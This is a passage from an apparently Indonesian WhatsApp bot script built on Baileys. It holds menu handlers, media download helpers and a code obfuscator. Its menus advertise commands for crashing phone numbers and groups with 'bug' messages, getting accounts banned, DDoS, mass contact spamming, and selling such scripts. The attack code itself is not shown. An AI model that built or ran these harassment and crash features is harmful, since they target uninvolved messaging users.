			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (antilinkall)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (!isOwner) return reply(bvl)
        await Biiofc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Biiofc.sendMessage(from, {text:`\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\n@${m.sender.split("@")[0]} https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `RaffHost`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Biiofc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Biiofc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

let teks_format =`*Berikut ini cara order kode otp*

_Example_
.order id

_Contoh_
.order 14

untuk melihat id layanan
silahkan ketik .layanan`

let teks_format2 = `Format Salah !!

_Example_
.getorder <order_id>

_Contoh_
.getorder 55778888
`

Biiofc.readMessages([m.key])

switch (command) {
case "menu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

_I Am *BotzzV8* Made By RIDZ STORE_
_If There Is An Error!!_
_Please Report To Developer_
_Berikut Saldo anda_ Rp: ${toRupiah(cekSaldo(sender, db_saldo))}
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
「 *BOT INFO* 」
⭔Nama Creator : *${namaCreator}*
⭔Nomor Creator : *@${owned.split("@")[0]}*
⭔Nama Script : *${global.namasc}*
⭔Versi Script : *${global.versisc}*
⭔Version Baileys : *^${version}*
⭔Type Baileys : *Multi-device*

*RUNTIME*
${runtime(process.uptime())}
▭▬▭( *LIST MENU* )▭▬▭

⭔${prefix}allmenu
⭔${prefix}groupmenu
⭔${prefix}ownermenu
⭔${prefix}downloadmenu
⭔${prefix}pushkontakmenu
⭔${prefix}bugmenu
⭔${prefix}panelmenu
⭔${prefix}otomatismenu
⭔${prefix}soundmenu
⭔${prefix}domainmenu
⭔${prefix}testimonimenu
⭔${prefix}randommenu
⭔${prefix}storemenu
⭔${prefix}cmdmenu
⭔${prefix}pm2menu
⭔${prefix}stalkmenu
⭔${prefix}vpsmenu
⭔${prefix}otpmenu
⭔${prefix}scmenu
⭔${prefix}swmenu

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f441449176f49ca93d4a.jpg',
sourceUrl: "https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/audio.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "allmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

_I Am *BotzzAzril* Made By RIDZ STORE
_If There Is An Error!!_
_Please Report To Developer_
_Berikut Saldo anda_ Rp: ${toRupiah(cekSaldo(sender, db_saldo))}
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
「 *BOT INFO* 」
⭔Nama Creator : *${namaCreator}*
⭔Nomor Creator : *@${owned.split("@")[0]}*
⭔Nama Script : *${global.namasc}*
⭔Versi Script : *${global.versisc}*
⭔Version Baileys : *^${version}*
⭔Type Baileys : *Multi-device*

*RUNTIME*
${runtime(process.uptime())}
▭▬▭( *OWNER MENU* )▭▬▭

⭔ ${prefix}addowner *nomor*
⭔ ${prefix}delowner *nomor*
⭔ ${prefix}addprem *nomor*
⭔ ${prefix}delprem *nomor*
⭔ ${prefix}setbotname *teks*
⭔ ${prefix}setbotbio *teks*
⭔ ${prefix}accreport
⭔ ${prefix}sosmed
⭔ ${prefix}leave
⭔ ${prefix}sewabot
⭔ ${prefix}creategc *teksgc*
⭔ ${prefix}sdomain/sendomain
⭔ ${prefix}spanel/sendpanel
⭔ ${prefix}svps/sendvps
⭔ ${prefix}public *on/off*
⭔ ${prefix}self *on/off*
⭔ ${prefix}unblock
⭔ ${prefix}block

▭▬▭( *BUG EMOJI* )▭▬▭

⭔ ${prefix}🌷 62xx|Jumblah
⭔ ${prefix}🐲 62xx|jumblah
⭔ ${prefix}🐉 62xx|Jumblah
⭔ ${prefix}🌵 62xx|Jumblah
⭔ ${prefix}🎄 62xx|Jumblah
⭔ ${prefix}🌲 62xx|Jumblah 
⭔ ${prefix}🌳 62xx|Jumblah
⭔ ${prefix}🌱 62xx|Jumblah
⭔ ${prefix}😈 62xx|Jumblah
⭔ ${prefix}🗿 62xx|Jumblah
⭔ ${prefix}😎 62xx|Jumblah

▭▬▭( *PANEL MENU* )▭▬▭

⭔${prefix}panel
⭔${prefix}listusr
⭔${prefix}delusr
⭔${prefix}listsrv
⭔${prefix}delsrv
⭔${prefix}tutorial
⭔${prefix}ramlist
⭔${prefix}premlist
⭔${prefix}addusr
⭔${prefix}addsrv
⭔${prefix}updatesrv
⭔${prefix}suspend *id*
⭔${prefix}unsuspend *id*
⭔${prefix}crateadmin
⭔${prefix}listadmin
⭔${prefix}buysewa
⭔${prefix}sewa

▭▬▭( *BUG MENU* )▭▬▭

⭔ ${prefix}bugnumber
⭔ ${prefix}buggroup
⭔ ${prefix}bannedmenu
⭔ ${prefix}unbanmenu
⭔ ${prefix}bugemoji
⭔ ${prefix}reportbug

▭▬▭( *TESTIMONI MENU* )▭▬▭

⭔ ${prefix}testi1
⭔ ${prefix}testi2
⭔ ${prefix}testi3
⭔ ${prefix}testi4
⭔ ${prefix}testi5
⭔ ${prefix}testi6
⭔ ${prefix}testi7 ( proses )

▭▬▭( *OTP MENU* )▭▬▭

⭔ ${prefix}profile
⭔ ${prefix}layanan
⭔ ${prefix}order
⭔ ${prefix}wanumber
⭔ ${prefix}neednokos
⭔ ${prefix}nokoswa
⭔ ${prefix}getorder
⭔ ${prefix}nowa

▭▬▭( *MENU GROUP* )▭▬▭

⭔ ${prefix}owner
⭔ ${prefix}qc *teks*
⭔ ${prefix}tts *teks*
⭔ ${prefix}sticker *reply image*
⭔ ${prefix}linkgroup
⭔ ${prefix}hidetag *teks*
⭔ ${prefix}setppbot *teks*
⭔ ${prefix}setppgroup *teks*
⭔ ${prefix}delppgc
⭔ ${prefix}add *nomor*
⭔ ${prefix}kick *nomor*
⭔ ${prefix}promote *nomor*
⭔ ${prefix}demote *nomor*
⭔ ${prefix}promoteall *nomor*
⭔ ${prefix}demoteall *nomor*
⭔ ${prefix}antilink *on/off*

▭▬▭( *MENU PUSHKONTAK* )▭▬▭

⭔ ${prefix}cekidgc
⭔ ${prefix}listgroup
⭔ ${prefix}pushkontakv1 *idgc|teks*
⭔ ${prefix}pushkontakv2 *teks*
⭔ ${prefix}pushkontakv3 *idgroup|jeda|teks*
⭔ ${prefix}pushkontakv4 *jeda|teks*
⭔ ${prefix}savecontactv1 *idgroup*
⭔ ${prefix}savecontactv2 *teks*
⭔ ${prefix}savekontak *teks*
⭔ ${prefix}getcontact *teks*
⭔ ${prefix}sendkontak *teks*
⭔ ${prefix}bcvideo *teks*
⭔ ${prefix}bcgc *teks*
⭔ ${prefix}jpm *teks*

▭▬▭( *BUG ATTACK NOMBER* )▭▬▭

⭔ ${prefix}gas *nomor|jumlah*
⭔ ${prefix}kill *nomor|jumlah*
⭔ ${prefix}crash *nomor|jumlah*
⭔ ${prefix}shoot *nomor|jumlah*
⭔ ${prefix}bugkuy *nomor|jumlah*
⭔ ${prefix}duarr *nomor|jumlah*
⭔ ${prefix}killyou *nomor|jumlah*
⭔ ${prefix}doblekill *nomor|jumlah*
⭔ ${prefix}triplekill *nomor|jumlah*
⭔ ${prefix}savage *nomor|jumlah*
⭔ ${prefix}santet *nomor|jumlah*
⭔ ${prefix}danger *nomor|jumlah*
⭔ ${prefix}meninggal *nomor|jumlah*
⭔ ${prefix}headshot *nomor|jumlah*
⭔ ${prefix}mati *nomor|jumlah*

▭▬▭( *BUG ATTACK GRUP v1* )▭▬▭

⭔ ${prefix}killgc *linkgc|jumlah*
⭔ ${prefix}santetgc *linkgc|jumlah*
⭔ ${prefix}gcwakwaw *linkgc|jumlah*
⭔ ${prefix}togc *linkgc|jumlah*
⭔ ${prefix}matigc *linkgc|jumlah*
⭔ ${prefix}kuygc *linkgc|jumlah*
⭔ ${prefix}attackgc *linkgc|jumlah*
⭔ ${prefix}mampusgc *linkgc|jumlah*
⭔ ${prefix}gasgc *linkgc|jumlah*
⭔ ${prefix}ampasgc *linkgc|jumlah*
⭔ ${prefix}bahayagc *linkgc|jumlah*
⭔ ${prefix}hatihatigc *linkgc|jumlah*
⭔ ${prefix}crashgc *linkgc|jumlah*
⭔ ${prefix}stuckgc *linkgc|jumlah*
⭔ ${prefix}ganasgc *linkgc|jumlah*

▭▬▭( *BUG ATTACK GRUP v2* )▭▬▭

⭔ ${prefix}buggc *idgroup|jumlah*
⭔ ${prefix}shootgc *idgroup|jumlah*
⭔ ${prefix}dorrgc *idgroup|jumlah*
⭔ ${prefix}attackgc1 *idgroup|jumlah*
⭔ ${prefix}meninggalgc *idgroup|jumlah*
⭔ ${prefix}matigc1*idgroup|jumlah*
⭔ ${prefix}seranggc *idgroup|jumlah*
⭔ ${prefix}bomgc *idgroup|jumlah*
⭔ ${prefix}ledakangc *idgroup|jumlah*
⭔ ${prefix}atomgc *idgroup|jumlah*
⭔ ${prefix}hancurgc *idgroup|jumlah*
⭔ ${prefix}bugzirgc *idgroup|jumlah*
⭔ ${prefix}stuckgc2 *idgroup|jumlah*
⭔ ${prefix}baugc *idgroup|jumlah*
⭔ ${prefix}ultigc *idgroup|jumlah*

▭▬▭( *MENU BANNED* )▭▬▭

⭔ ${prefix}call *nomor*
⭔ ${prefix}out *nomor*
⭔ ${prefix}verif *nomor*
⭔ ${prefix}kenon *nomor*
⭔ ${prefix}bannedv1 *nomor*
⭔ ${prefix}bannedv2 *nomor*
⭔ ${prefix}bannedv3 *nomor*
⭔ ${prefix}bannedv4 *nomor*
⭔ ${prefix}bannedv5 *nomor*
⭔ ${prefix}bannedv6 *nomor*

▭▬▭( *MENU UNBANNED* )▭▬▭

⭔ ${prefix}unbannedv1 *nomor*
⭔ ${prefix}unbannedv2 *nomor*
⭔ ${prefix}unbannedv3 *nomor*
⭔ ${prefix}unbannedv4 *nomor*
⭔ ${prefix}unbannedv5 *nomor*

▬▭( *ALL OTOMATIS* )▭▬

⭔ ${prefix}buysc
⭔ ${prefix}buyakn
⭔ ${prefix}buyvps
⭔ ${prefix}buysrv 
⭔ ${prefix}deposit
⭔ ${prefix}buyprem
⭔ ${prefix}buyowner
⭔ ${prefix}adminpanel
⭔ ${prefix}cekharga
⭔ ${prefix}payment
⭔ ${prefix}donasi
⭔ ${prefix}jasa
⭔ ${prefix}vps

▭▬▭( *RANDOM CECAN* )▭▬▭

⭔ ${prefix}randomcecan1
⭔ ${prefix}randomcecan2
⭔ ${prefix}randomcecan3
⭔ ${prefix}randomcecan4
⭔ ${prefix}randomcecan5
⭔ ${prefix}randomcecan6
⭔ ${prefix}randomcecan7
⭔ ${prefix}randomcecan8
⭔ ${prefix}randomcecan9
⭔ ${prefix}randomcecan10

▭▬▭( *COMMAND BUYSC* )▭▬▭

 ⭔${prefix}buyscbugv1
 ⭔${prefix}buyscbugv2
 ⭔${prefix}buyscbugv3
 ⭔${prefix}buyscv2
 ⭔${prefix}buyscv3
 ⭔${prefix}buyscv3subdo
 ⭔${prefix}buyscv4
 ⭔${prefix}buyscv5
 ⭔${prefix}buyscv6
 ⭔${prefix}buyscv6subdo
 ⭔${prefix}buyscv7otp
 ⭔${prefix}buyscv7addpm2
 ⭔${prefix}buyscjagagrupv1
 ⭔${prefix}buyscjagagrupv2
 ⭔${prefix}buyscpushkontak
 ⭔${prefix}buyschwv191
 ⭔${prefix}buyschwv192
 ⭔${prefix}buyschwv201
 ⭔${prefix}buyschwv202
 ⭔${prefix}buyscpanel
 ⭔${prefix}buyscpushautosave
 ⭔${prefix}buyscjpmv1
 ⭔${prefix}buyscjpmv2
 ⭔${prefix}buyscjpmv3
 ⭔${prefix}buyscvps1
 ⭔${prefix}buyscvps2
 ⭔${prefix}buyscpm2
 ⭔${prefix}buyscthemav1
 ⭔${prefix}buyscthemav2
 ⭔${prefix}buyscnowa
 ⭔${prefix}buyscwebp
 ⭔${prefix}buysctesmoni
 ⭔${prefix}buyscddos
 ⭔${prefix}buymodule
 ⭔${prefix}buyscbukaenc

▬▭( *ALL OTOMATIS* )▭▬

⭔ ${prefix}dana
⭔ ${prefix}gopay
⭔ ${prefix}qris

▭▬▭( *ADMIN PANEL* )▭▬▭

⭔${prefix}buyadminpanel
⭔${prefix}panelprem

▭▬▭( *STORE MENU* )▭▬▭

⭔ ${prefix}done
⭔ ${prefix}batal
⭔ ${prefix}tunda
⭔ ${prefix}proses
⭔ ${prefix}reqvps
⭔ ${prefix}reqpanel

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/5f441449176f49ca93d4a.jpg',
sourceUrl: "https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/audio1.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "bugemoji": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUG EMOJI* )▭▬▭

⭔ ${prefix}🌷 62xx|Jumblah
⭔ ${prefix}🐲 62xx|jumblah
⭔ ${prefix}🐉 62xx|Jumblah
⭔ ${prefix}🌵 62xx|Jumblah
⭔ ${prefix}🎄 62xx|Jumblah
⭔ ${prefix}🌲 62xx|Jumblah 
⭔ ${prefix}🌳 62xx|Jumblah
⭔ ${prefix}🌱 62xx|Jumblah
⭔ ${prefix}😈 62xx|Jumblah
⭔ ${prefix}🗿 62xx|Jumblah
⭔ ${prefix}😎 62xx|Jumblah

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "panelmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *PANEL MENU* )▭▬▭

⭔${prefix}panel
⭔${prefix}listusr
⭔${prefix}delusr
⭔${prefix}listsrv
⭔${prefix}delsrv
⭔${prefix}tutorial
⭔${prefix}ramlist
⭔${prefix}premlist
⭔${prefix}addusr
⭔${prefix}addsrv
⭔${prefix}updatesrv
⭔${prefix}suspend *id*
⭔${prefix}unsuspend *id*
⭔${prefix}crateadmin
⭔${prefix}listadmin
⭔${prefix}buysewa
⭔${prefix}sewa

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textbi, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "bugmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUG MENU* )▭▬▭

⭔ ${prefix}bugnumber
⭔ ${prefix}buggroup
⭔ ${prefix}bannedmenu
⭔ ${prefix}unbanmenu
⭔ ${prefix}bugemoji
⭔ ${prefix}reportbug

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "testimonimenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TESTIMONI MENU* )▭▬▭

⭔ ${prefix}testi1
⭔ ${prefix}testi2
⭔ ${prefix}testi3
⭔ ${prefix}testi4
⭔ ${prefix}testi5
⭔ ${prefix}testi6
⭔ ${prefix}testi7 ( Proses )

 Testimoni By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "scmenu": {
if (!isOwner) return reply(`Khusus RIDZ STORE Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *KHUSUS raff* )▭▬▭

⭔ ${prefix}ambilsc1
⭔ ${prefix}ambilsc2
⭔ ${prefix}ambilsc3
⭔ ${prefix}ambilsc4
⭔ ${prefix}ambilsc5
⭔ ${prefix}ambilsc6

 *_Note : Sc Free Nanti Menambah Tunggu Owner Saya Meng Update Terimakasih._*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "RIDZ STORE": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *KHUSUS RIDZ STORE* )▭▬▭

⭔ ${prefix}RIDZ STORE1
⭔ ${prefix}RIDZ STORE2
⭔ ${prefix}RIDZ STORE3

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "otpmenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *OTP MENU* )▭▬▭

⭔ ${prefix}profile
⭔ ${prefix}layanan
⭔ ${prefix}wanumber
⭔ ${prefix}neednokos
⭔ ${prefix}nokoswa
⭔ ${prefix}order
⭔ ${prefix}getorder
⭔ ${prefix}nowa

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "groupmenu": {
const txtus = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU GROUP* 』
│ ${prefix}owner
│ ${prefix}qc *teks*
│ ${prefix}tts *teks*
│ ${prefix}sticker *reply image*
│ ${prefix}linkgroup
│ ${prefix}hidetag *teks*
│ ${prefix}setppbot *teks*
│ ${prefix}setppgroup *teks*
│ ${prefix}delppgc
│ ${prefix}add *nomor*
│ ${prefix}kick *nomor*
│ ${prefix}promote *nomor*
│ ${prefix}demote *nomor*
│ ${prefix}promoteall *nomor*
│ ${prefix}demoteall *nomor*
│ ${prefix}antilinkytch *on/off*
│ ${prefix}antilinkytvid *on/off*
│ ${prefix}antilinktwitter *on/off*
│ ${prefix}antilinktiktok *on/off*
│ ${prefix}antilinktelegram *on/off*
│ ${prefix}antilinkfacebook *on/off*
│ ${prefix}antilinkinstagram *on/off*
│ ${prefix}antipannel *on/off*
│ ${prefix}antilinkall *on/off*
│ ${prefix}antiwame *on/off*
│ ${prefix}antilinkgc *on/off*
│ ${prefix}antivirus *on/off*
└──────`
reply(txtus)
}
break
case "ownermenu": {
const txtow = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU OWNER* 』
│ ${prefix}addowner *nomor*
│ ${prefix}delowner *nomor*
│ ${prefix}addprem *nomor*
│ ${prefix}delprem *nomor*
│ ${prefix}setbotname *teks*
│ ${prefix}setbotbio *teks*
│ ${prefix}raff
│ ${prefix}accreport
│ ${prefix}listonline
│ ${prefix}vidowner1
│ ${prefix}closetime
│ ${prefix}opentime
│ ${prefix}delete
│ ${prefix}totag
│ ${prefix}pesan
│ ${prefix}leave
│ ${prefix}ddos
│ ${prefix}sendgc
│ ${prefix}sosmed
│ ${prefix}sewabot
│ ${prefix}creategc *teksgc*
│ ${prefix}sdomain/sendomain
│ ${prefix}spanel/sendpanel
│ ${prefix}svps/sendvps
│ ${prefix}autojpm *on/off*
│ ${prefix}public *on/off*
│ ${prefix}self *on/off*
│ ${prefix}addip *ip*
│ ${prefix}ambilfitur
│ ${prefix}ambilcase
│ ${prefix}totalfitur
│ ${prefix}addpm2
│ ${prefix}getpm2
│ ${prefix}getbot
│ ${prefix}getbio
│ ${prefix}listpc
│ ${prefix}listgc
│ ${prefix}listblock
│ ${prefix}unblock
│ ${prefix}block
│ ${prefix}enc
└──────`
reply(txtow)
}
break
case "pushkontakmenu": {
const txtpu = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU PUSHKONTAK* 』
│ ${prefix}cekidgc
│ ${prefix}listgroup
│ ${prefix}pushkontakv1 *idgc|teks*
│ ${prefix}pushkontakv2 *teks*
│ ${prefix}pushkontakv3 *idgroup|jeda|teks*
│ ${prefix}pushkontakv4 *jeda|teks*
│ ${prefix}savecontactv1 *idgroup*
│ ${prefix}savecontactv2 *teks*
│ ${prefix}savekontak *teks*
│ ${prefix}getcontact *teks*
│ ${prefix}sendkontak *teks*
│ ${prefix}bcvideo *teks*
│ ${prefix}bcgc *teks*
│ ${prefix}jpm *teks*
└──────`
reply(txtpu)
}
break
case "bugnumber": {
const owned = `${owner}@s.whatsapp.net`
const txtat = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© RIDZ STORE*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK NUMBER* 」
● ${prefix}gas *nomor|jumlah*
● ${prefix}kill *nomor|jumlah*
● ${prefix}crash *nomor|jumlah*
● ${prefix}shoot *nomor|jumlah*
● ${prefix}bugkuy *nomor|jumlah*
● ${prefix}duarr *nomor|jumlah*
● ${prefix}killyou *nomor|jumlah*
● ${prefix}doblekill *nomor|jumlah*
● ${prefix}triplekill *nomor|jumlah*
● ${prefix}savage *nomor|jumlah*
● ${prefix}santet *nomor|jumlah*
● ${prefix}danger *nomor|jumlah*
● ${prefix}meninggal *nomor|jumlah*
● ${prefix}headshot *nomor|jumlah*
● ${prefix}mati *nomor|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtat)
}
break
case "buggroup":{
const owned = `${owner}@s.whatsapp.net`
const txtv1 = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© RIDZ STORE*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK GROUP v1* 」
● ${prefix}killgc *linkgc|jumlah*
● ${prefix}santetgc *linkgc|jumlah*
● ${prefix}gcwakwaw *linkgc|jumlah*
● ${prefix}togc *linkgc|jumlah*
● ${prefix}matigc *linkgc|jumlah*
● ${prefix}kuygc *linkgc|jumlah*
● ${prefix}attackgc *linkgc|jumlah*
● ${prefix}mampusgc *linkgc|jumlah*
● ${prefix}gasgc *linkgc|jumlah*
● ${prefix}ampasgc *linkgc|jumlah*
● ${prefix}bahayagc *linkgc|jumlah*
● ${prefix}hatihatigc *linkgc|jumlah*
● ${prefix}crashgc *linkgc|jumlah*
● ${prefix}stuckgc *linkgc|jumlah*
● ${prefix}ganasgc *linkgc|jumlah*

「 *BUG ATTACK GROUP v2* 」
● ${prefix}buggc *idgroup|jumlah*
● ${prefix}shootgc *idgroup|jumlah*
● ${prefix}dorrgc *idgroup|jumlah*
● ${prefix}attackgc1 *idgroup|jumlah*
● ${prefix}meninggalgc *idgroup|jumlah*
● ${prefix}matigc1*idgroup|jumlah*
● ${prefix}seranggc *idgroup|jumlah*
● ${prefix}bomgc *idgroup|jumlah*
● ${prefix}ledakangc *idgroup|jumlah*
● ${prefix}atomgc *idgroup|jumlah*
● ${prefix}hancurgc *idgroup|jumlah*
● ${prefix}bugzirgc *idgroup|jumlah*
● ${prefix}stuckgc2 *idgroup|jumlah*
● ${prefix}baugc *idgroup|jumlah*
● ${prefix}ultigc *idgroup|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtv1)
}
break
case "bannedmenu":{
const txtv2 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU BANNED* 』
│ ${prefix}call *nomor*
│ ${prefix}out *nomor*
│ ${prefix}verif *nomor*
│ ${prefix}kenon *nomor*
│ ${prefix}bannedv1 *nomor*
│ ${prefix}bannedv2 *nomor*
│ ${prefix}bannedv3 *nomor*
│ ${prefix}bannedv4 *nomor*
│ ${prefix}bannedv5 *nomor*
│ ${prefix}bannedv6 *nomor*
└──────`
reply(txtv2)
}
break
case "unbanmenu":{
const txt226 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU UNBANNED* 』
│ ${prefix}unbannedv1 *nomor*
│ ${prefix}unbannedv2 *nomor*
│ ${prefix}unbannedv3 *nomor*
│ ${prefix}unbannedv4 *nomor*
│ ${prefix}unbannedv5 *nomor*
└──────`
reply(txt226)
}
break
        case "otomatismenu": {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

